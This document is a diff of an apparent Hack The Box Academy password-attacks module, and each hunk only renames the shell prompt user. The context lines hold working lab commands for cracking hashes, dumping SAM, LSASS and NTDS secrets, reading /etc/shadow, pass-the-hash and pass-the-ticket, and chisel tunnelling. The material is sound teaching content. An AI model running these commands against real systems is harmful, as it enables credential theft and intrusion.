@@ -220,7 +220,7 @@ However, a few more files belong to the user management system of Linux. The oth
 &#x20; Credential Storage
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/passwd
+root@htb[/htb]$ cat /etc/passwd
 
 ...SNIP...
 htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
@@ -369,7 +369,7 @@ Rainbow table attacks involve using a pre-computed table of hashes and their cor
 &#x20; John The Ripper
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
+root@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
 ```
 
 For example, if we have a file named `hashes_to_crack.txt` that contains `SHA-256` hashes, the command to crack them would be:
@@ -377,7 +377,7 @@ For example, if we have a file named `hashes_to_crack.txt` that contains `SHA-25
 &#x20; John The Ripper
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --format=sha256 hashes_to_crack.txt
+root@htb[/htb]$ john --format=sha256 hashes_to_crack.txt
 ```
 
 * `john` is the command to run the John the Ripper program
@@ -463,7 +463,7 @@ John will output the cracked passwords to the console and the file "john.pot" (`
 &#x20; John The Ripper
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>
+root@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>
 ```
 
 First, we specify the wordlist file or files to use for cracking the password hashes. The wordlist(s) can be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Then we can specify a rule set or apply the built-in mangling rules to the words in the wordlist. These rules generate candidate passwords using transformations such as appending numbers, capitalizing letters and adding special characters.
@@ -479,7 +479,7 @@ The syntax for running John the Ripper in incremental mode is as follows:
 &#x20; John The Ripper
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --incremental <hash_file>
+root@htb[/htb]$ john --incremental <hash_file>
 ```
 
 Using this command we will read the hashes in the specified hash file and then generate all possible combinations of characters, starting with a single character and incrementing with each iteration. It is important to note that this mode is `highly resource intensive` and can take a long time to complete, depending on the complexity of the passwords, machine configuration, and the number of characters set. Additionally, it is important to note that the default character set is limited to `a-zA-Z0-9`. Therefore, if we attempt to crack complex passwords with special characters, we need to use a custom character set.
@@ -526,7 +526,7 @@ More of these tools can be found on `Pwnbox` in the following way:
 &#x20; John The Ripper
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ locate *2john*
+root@htb[/htb]$ locate *2john*
 
 /usr/bin/bitlocker2john
 /usr/bin/dmg2john
@@ -1164,7 +1164,7 @@ We can imagine that we have found some applications used in the network by our c
 &#x20; Password Reuse / Default Passwords
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
+root@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
 ```
 
 **Credential Stuffing - Hydra**
@@ -1172,7 +1172,7 @@ AbdulrahmanTamim@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
 &#x20; Password Reuse / Default Passwords
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -C user_pass.list ssh://10.129.42.197
+root@htb[/htb]$ hydra -C user_pass.list ssh://10.129.42.197
 
 ...
 ```
@@ -1245,7 +1245,7 @@ All we must do to create the share is run smbserver.py -smb2support using python
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+root@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1281,7 +1281,7 @@ Then we can confirm that our hive copies successfully moved to the share by navi
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 sam.save  security.save  system.save
 ```
@@ -1297,7 +1297,7 @@ One incredibly useful tool we can use to dump the hashes offline is Impacket's `
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ locate secretsdump 
+root@htb[/htb]$ locate secretsdump 
 ```
 
 Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.
@@ -1307,7 +1307,7 @@ Using secretsdump.py is a simple process. All we must do is run secretsdump.py u
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+root@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -1361,7 +1361,7 @@ As mentioned previously, we can populate a text file with the NT hashes we were 
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo vim hashestocrack.txt
+root@htb[/htb]$ sudo vim hashestocrack.txt
 
 64f12cddaa88057e06a81b54e73b949b
 31d6cfe0d16ae931b73c59d7e0c089c0
@@ -1379,7 +1379,7 @@ Hashcat has many different modes we can use. Selecting a mode is largely depende
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+root@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -1431,7 +1431,7 @@ With access to credentials with `local admin privileges`, it is also possible fo
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+root@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 
 SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
 SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
@@ -1450,7 +1450,7 @@ We can also dump hashes from the SAM database remotely.
 &#x20; Attacking SAM
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+root@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 
 SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
 SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
@@ -1589,7 +1589,7 @@ The command initiates the use of `pypykatz` to parse the secrets hidden in the L
 &#x20; Attacking LSASS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+root@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 
 INFO:root:Parsing file /home/peter/Documents/lsass.dmp
 FILE: ======== /home/peter/Documents/lsass.dmp =======
@@ -1756,7 +1756,7 @@ Now we can use Hashcat to crack the NT Hash. In this example, we only found one 
 &#x20; Attacking LSASS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+root@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
 ```
@@ -1815,7 +1815,7 @@ We can create a custom list on our attack host using the names above. We can use
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat usernames.txt 
+root@htb[/htb]$ cat usernames.txt 
 bwilliamson
 benwilliamson
 ben.willamson
@@ -1837,7 +1837,7 @@ We can manually create our list(s) or use an `automated list generator` such as 
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
+root@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
 
 ben
 benwilliamson
@@ -1924,7 +1924,7 @@ Once we have our list(s) prepared or discover the naming convention and some emp
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+root@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 
 SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
 SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
@@ -1960,7 +1960,7 @@ We can connect to a target DC using the credentials we captured.
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+root@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 ```
 
 Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
@@ -2101,7 +2101,7 @@ Alternatively, we may benefit from using CrackMapExec to accomplish the same ste
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+root@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 
 SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
 SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
@@ -2150,7 +2150,7 @@ We can proceed with creating a text file containing all the NT hashes, or we can
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+root@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
 64f12cddaa88057e06a81b54e73b949b:Password1
 ```
@@ -2170,7 +2170,7 @@ We can still use hashes to attempt to authenticate with a system using a type of
 &#x20; Attacking Active Directory & NTDS.dit
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+root@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
 ```
 
 We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module `AD Enumeration and Attacks`.
@@ -2779,7 +2779,7 @@ The tool [Firefox Decrypt](https://github.com/unode/firefox\_decrypt) is excelle
 &#x20; Credential Hunting in Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3.9 firefox_decrypt.py
+root@htb[/htb]$ python3.9 firefox_decrypt.py
 
 Select the Mozilla profile you wish to decrypt
 1 -> lfx3lvhb.default
@@ -2941,7 +2941,7 @@ The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file wher
 **Reading /etc/security/opasswd**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo cat /etc/security/opasswd
+root@htb[/htb]$ sudo cat /etc/security/opasswd
 
 cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
 ```
@@ -2957,28 +2957,28 @@ Once we have collected some hashes, we can try to crack them in different ways t
 **Unshadow**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
-AbdulrahmanTamim@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
-AbdulrahmanTamim@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+root@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
+root@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
+root@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 ```
 
 **Hashcat - Cracking Unshadowed Hashes**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+root@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 ```
 
 **Hashcat - Cracking MD5 Hashes**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat md5-hashes.list
+root@htb[/htb]$ cat md5-hashes.list
 
 qNDkF0zJ3v8ylCOrKB0kt0
 E9uMSmiQeRh4pAAgzuvkq1
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
+root@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
 ```
 
 
@@ -3129,7 +3129,7 @@ The result is a reverse shell connection from the DC01 host (172.16.1.10).
 &#x20; Pass the Hash (PtH)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+root@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -3163,7 +3163,7 @@ There are several other tools in the Impacket toolkit we can use for command exe
 &#x20; Pass the Hash (PtH)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+root@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
 SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
@@ -3178,7 +3178,7 @@ If we want to perform the same actions but attempt to authenticate to each host 
 &#x20; Pass the Hash (PtH)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+root@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
 
 SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
 SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
@@ -3199,7 +3199,7 @@ Review the [CrackMapExec documentation Wiki](https://wiki.porchetta.industries/)
 &#x20; Pass the Hash (PtH)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+root@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 Evil-WinRM shell v3.3
 
@@ -3241,7 +3241,7 @@ Once the registry key is added, we can use `xfreerdp` with the option `/pth` to 
 &#x20; Pass the Hash (PtH)
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+root@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
 [15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
 [15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
@@ -3995,7 +3995,7 @@ Let's assume we are in a new assessment, and the company gives us access to `LIN
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+root@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
 
 david@inlanefreight.htb@10.129.204.23's password: 
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
@@ -4297,7 +4297,7 @@ Once we log in with the credentials for the user `svc_workstations`, we can use 
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+root@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                   
 svc_workstations@inlanefreight.htb@10.129.204.23's password: 
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
@@ -4403,7 +4403,7 @@ In this scenario, our attack host doesn't have a connection to the `KDC/Domain C
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/hosts
+root@htb[/htb]$ cat /etc/hosts
 
 # Host addresses
 
@@ -4418,7 +4418,7 @@ We need to modify our proxychains configuration file to use socks5 and port 1080
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/proxychains.conf
+root@htb[/htb]$ cat /etc/proxychains.conf
 
 <SNIP>
 
@@ -4433,10 +4433,10 @@ We must download and execute [chisel](https://github.com/jpillora/chisel) on our
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
-AbdulrahmanTamim@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
-AbdulrahmanTamim@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
-AbdulrahmanTamim@htb[/htb]$ sudo ./chisel server --reverse 
+root@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+root@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
+root@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
+root@htb[/htb]$ sudo ./chisel server --reverse 
 
 2022/10/10 07:26:15 server: Reverse tunneling enabled
 2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
@@ -4450,7 +4450,7 @@ Connect to `MS01` via RDP and execute chisel (located in C:\Tools).
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+root@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
 ```
 
 **Execute chisel from MS01**
@@ -4473,7 +4473,7 @@ Finally, we need to transfer Julio's ccache file from `LINUX01` and create the e
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+root@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
 
 Note: If you are not familiar with file transfer operations, check out the module [File Transfers](https://academy.hackthebox.com/module/details/24).
@@ -4487,7 +4487,7 @@ To use the Kerberos ticket, we need to specify our target machine name (not the 
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
+root@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
 
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -4518,7 +4518,7 @@ To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt-get install krb5-user -y
+root@htb[/htb]$ sudo apt-get install krb5-user -y
 
 Reading package lists... Done                                                                                                  
 Building dependency tree... Done    
@@ -4544,7 +4544,7 @@ In case the package `krb5-user` is already installed, we need to change the conf
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/krb5.conf
+root@htb[/htb]$ cat /etc/krb5.conf
 
 [libdefaults]
         default_realm = INLANEFREIGHT.HTB
@@ -4566,7 +4566,7 @@ Now we can use evil-winrm.
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
+root@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -4597,7 +4597,7 @@ If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machin
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+root@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -4669,8 +4669,8 @@ Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the m
 &#x20; Pass the Ticket (PtT) from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
-AbdulrahmanTamim@htb[/htb]$ /opt/linikatz.sh
+root@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+root@htb[/htb]$ /opt/linikatz.sh
  _ _       _ _         _
 | (_)_ __ (_) | ____ _| |_ ____
 | | | '_ \| | |/ / _` | __|_  /
@@ -4847,7 +4847,7 @@ If we see such a header in an SSH key, we will, in most cases, not be able to us
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ locate *2john*
+root@htb[/htb]$ locate *2john*
 
 /usr/bin/bitlocker2john
 /usr/bin/dmg2john
@@ -4879,8 +4879,8 @@ We can convert many different formats into single hashes and try to crack the pa
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
-AbdulrahmanTamim@htb[/htb]$ cat ssh.hash 
+root@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
+root@htb[/htb]$ cat ssh.hash 
 
 ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
 ```
@@ -4892,7 +4892,7 @@ Next, we need to customize the commands accordingly with the password list and s
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
+root@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
@@ -4910,7 +4910,7 @@ Session completed
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john ssh.hash --show
+root@htb[/htb]$ john ssh.hash --show
 
 SSH.private:1234
 
@@ -4930,8 +4930,8 @@ Pretty much all reports, documentation, and information sheets can be found in t
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
-AbdulrahmanTamim@htb[/htb]$ cat protected-docx.hash
+root@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
+root@htb[/htb]$ cat protected-docx.hash
 
 Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
 ```
@@ -4939,7 +4939,7 @@ Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
+root@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
 
 Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
 Cost 1 (MS Office version) is 2007 for all loaded hashes
@@ -4955,7 +4955,7 @@ Session completed
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john protected-docx.hash --show
+root@htb[/htb]$ john protected-docx.hash --show
 
 Protected.docx:1234
 ```
@@ -4965,8 +4965,8 @@ Protected.docx:1234
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
-AbdulrahmanTamim@htb[/htb]$ cat pdf.hash 
+root@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
+root@htb[/htb]$ cat pdf.hash 
 
 PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
 ```
@@ -4974,7 +4974,7 @@ PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
+root@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
@@ -4990,7 +4990,7 @@ Session completed
 &#x20; Protected Files
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john pdf.hash --show
+root@htb[/htb]$ john pdf.hash --show
 
 PDF.pdf:1234
 
@@ -5025,7 +5025,7 @@ An extensive list of archive types can be found on [FileInfo.com](https://filein
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
+root@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
 
 .mint
 .htmi 
@@ -5059,7 +5059,7 @@ The .zip format is often heavily used in Windows environments to compress many f
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ zip2john ZIP.zip > zip.hash
+root@htb[/htb]$ zip2john ZIP.zip > zip.hash
 
 ver 2.0 efh 5455 efh 7875 ZIP.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=42, decmplen=30, crc=490E7510
 ```
@@ -5071,7 +5071,7 @@ By extracting the hashes, we will also see which files are in the ZIP archive.
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat zip.hash 
+root@htb[/htb]$ cat zip.hash 
 
 ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
 ```
@@ -5083,7 +5083,7 @@ Once we have extracted the hash, we can now use `john` again to crack it with th
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
+root@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
 
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -5100,7 +5100,7 @@ Session completed
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ john zip.hash --show
+root@htb[/htb]$ john zip.hash --show
 
 ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip
 
@@ -5118,7 +5118,7 @@ Furthermore, it is not always directly apparent whether the archive found is pas
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 GZIP.gzip  rockyou.txt
 ```
@@ -5128,7 +5128,7 @@ GZIP.gzip  rockyou.txt
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ file GZIP.gzip 
+root@htb[/htb]$ file GZIP.gzip 
 
 GZIP.gzip: openssl enc'd data with salted password
 ```
@@ -5142,7 +5142,7 @@ The following one-liner will show many errors related to the GZIP format, which 
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
